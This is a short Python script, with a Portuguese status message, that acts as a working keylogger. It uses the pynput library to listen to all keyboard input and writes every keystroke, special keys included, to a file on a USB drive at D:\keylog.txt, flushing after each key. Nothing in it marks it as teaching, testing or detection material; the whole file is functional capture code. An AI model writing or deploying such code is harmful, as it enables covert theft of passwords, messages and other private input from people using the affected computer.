import os
from pynput import keyboard

pendrive_path = 'D:\\keylog.txt'  

if not os.path.exists('D:\\'):
    print("Pendrive não encontrado.")
    exit()

with open(pendrive_path, 'a') as f:
    def on_press(key):
        try:
            f.write(f'{key.char}')
        except AttributeError:
            f.write(f' {key} ')
        f.flush()
    
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()
